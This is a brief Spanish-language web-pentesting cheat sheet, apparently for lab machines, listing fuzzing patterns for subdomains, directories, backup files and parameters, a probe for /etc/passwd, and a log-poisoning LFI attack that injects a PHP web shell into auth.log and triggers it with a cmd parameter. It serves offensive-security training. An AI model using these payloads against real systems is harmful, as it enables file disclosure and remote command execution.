# Bruteforce subdominios
```
FUZZ.maquina.htb
maquina.FUZZ.htb
```
# Bruteforce directorios
```
http://192.168.1.89/FUZZ
---
extensiones: zip,txt,html,php,gif,jpg
```
# Archivos backup
```
~archivo.php
```
# Bruteforce parámetros
```
file.php?FUZZ=id
---
file.php?FUZZ=/etc/passwd
```
# LFI
Log poisoning
```
'<?php system($_GET["cmd"]);?>'@192.168.10.11
---
file.php?file=/var/log/auth.log&cmd=id
```

# Checklist
- Revisra ruta .git
- Probar distintos diccionarios para fuerza bruta